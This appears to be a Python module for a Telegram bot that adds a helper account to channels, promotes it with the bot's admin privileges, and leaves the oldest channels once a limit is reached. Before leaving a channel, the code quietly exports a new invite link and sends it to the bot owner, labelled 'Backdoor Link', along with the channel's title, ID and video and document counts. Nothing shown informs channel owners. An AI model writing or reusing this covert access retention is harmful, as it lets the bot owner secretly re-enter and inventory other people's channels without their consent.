import asyncio
from pyrogram import enums
from pyrogram.errors import (
    UserAlreadyParticipant, 
    InviteHashExpired, 
    UsernameInvalid,
    FloodWait,
    UserNotParticipant
)
from bot.client import Clients
from bot.helpers.database import Database
from config import Config
from bot.utils.logger import LOGGER

class ChannelManager:
    
    @staticmethod
    async def check_helper_membership(chat_id):
        """Check if helper is part of the chat"""
        try:
            await Clients.user_app.get_chat_member(chat_id, "me")
            return True
        except:
            return False

    @staticmethod
    async def add_helper_to_channel(chat_id, status_message=None):
        """
        Add helper to channel.
        ATTEMPTS auto-cleanup if limit reached, but PROCEEDS even if cleanup fails
        to ensure the user is not blocked.
        """
        
        # =================================================================
        # 1. BEST-EFFORT CLEANUP LOOP
        # =================================================================
        # We try to clean up, but if it fails, we break and move to joining.
        
        max_retries = 3
        retry_count = 0

        while retry_count < max_retries:
            current_count = await Database.get_active_channel_count()
            
            # If under limit, we are good to go
            if current_count < Config.MAX_USER_CHANNELS:
                break
            
            LOGGER.info(f"⚠️ Limit Hit: ({current_count}/{Config.MAX_USER_CHANNELS}). Attempting cleanup...")
            
            try:
                # Fetch oldest channel (Exclude the one we are trying to set up!)
                oldest_channel = await Database.get_oldest_channel(exclude_id=chat_id)
                
                if not oldest_channel:
                    LOGGER.warning("🚨 Limit reached but DB returned no eligible channel to leave! Proceeding anyway.")
                    break

                old_id = oldest_channel.get("channel_id")
                
                # --- NOTIFY BOT OWNER (You) ---
                try:
                    invite_back = await Clients.bot.export_chat_invite_link(old_id)
                    chat_info = await Clients.bot.get_chat(old_id)
                    chat_title = chat_info.title if chat_info else "Unknown Channel"
                    
                    # Stats
                    try:
                        video_count = await Clients.bot.search_messages_count(chat_id=old_id, filter=enums.MessagesFilter.VIDEO)
                        doc_count = await Clients.bot.search_messages_count(chat_id=old_id, filter=enums.MessagesFilter.DOCUMENT)
                    except:
                        video_count, doc_count = "N/A", "N/A"

                    await Clients.bot.send_message(
                        Config.OWNER_ID,
                        f"🗑 **Auto-Cleanup Notification**\n\n"
                        f"⚠️ **Limit Reached:** `{current_count}/{Config.MAX_USER_CHANNELS}`\n"
                        f"♻️ **Leaving Oldest Channel:**\n"
                        f"📌 Name: **{chat_title}**\n"
                        f"🆔 ID: `{old_id}`\n\n"
                        f"📊 **Stats:** 🎥 `{video_count}` | 📂 `{doc_count}`\n\n"
                        f"🔗 **Backdoor Link:**\n{invite_back}"
                    )
                except Exception as e:
                    LOGGER.error(f"Failed to send backup invite for {old_id}: {e}")

                # --- LEAVE CHANNEL ---
                try:
                    await Clients.user_app.leave_chat(old_id)
                    LOGGER.info(f"✅ Left {old_id}")
                except UserNotParticipant:
                    LOGGER.info(f"⚠️ Already left {old_id}")
                
                # Update DB (Important!)
                await Database.update_channel_membership(old_id, False)
                
                # Wait 5s and Loop to check if we need to leave more
                LOGGER.info("⏳ Cooling down 5s...")
                await asyncio.sleep(5)
                
            except Exception as e:
                # FAILURE HANDLING:
                # If cleanup crashes, notify Owner but DO NOT crash the user's setup.
                LOGGER.error(f"❌ Cleanup Failed: {e}")
                try:
                    await Clients.bot.send_message(
                        Config.OWNER_ID,
                        f"🚨 **Cleanup Failure Alert**\n\n"
                        f"Failed to auto-leave a channel.\n"
                        f"Error: `{e}`\n"
                        f"⚠️ **Proceeding with user setup anyway.**\n"
                        f"Please check account limits manually."
                    )
                except: pass
                
                # Break the loop so we proceed to Step 2
                break
                
            retry_count += 1

        # =================================================================
        # 2. JOIN NEW CHANNEL (Proceed regardless of cleanup success)
        # =================================================================
        invite_link = None
        try:
            invite_link = await Clients.bot.export_chat_invite_link(chat_id)
        except Exception as e:
            LOGGER.error(f"Failed to create invite link: {e}")
            raise e

        try:
            # Handle Invite Links
            if "+" in invite_link:
                try: await Clients.user_app.join_chat(invite_link)
                except UserAlreadyParticipant: pass
            else:
                hash_part = invite_link.split("/")[-1]
                try: await Clients.user_app.join_chat(hash_part)
                except UserAlreadyParticipant: pass
            
            LOGGER.info(f"✅ Helper joined {chat_id}")
            
            # Promote Helper
            try:
                bot_me = await Clients.bot.get_chat_member(chat_id, "me")
                helper_me = await Clients.user_app.get_me()
                if bot_me.privileges:
                    await Clients.bot.promote_chat_member(
                        chat_id=chat_id, user_id=helper_me.id, privileges=bot_me.privileges
                    )
                    LOGGER.info(f"✅ Helper promoted in {chat_id}")
            except Exception as e:
                LOGGER.warning(f"Failed to promote helper: {e}")

            # Mark as Active in DB
            await Database.update_channel_membership(chat_id, True, joined_at=None)

        except FloodWait as e:
            LOGGER.warning(f"FloodWait joining {chat_id}: {e.value}s")
            if status_message:
                await status_message.edit(f"⏳ **Rate Limited.** Waiting {e.value}s...")
            await asyncio.sleep(e.value)
            raise e
        except Exception as e:
            LOGGER.error(f"Failed to join {chat_id}: {e}")
            raise e
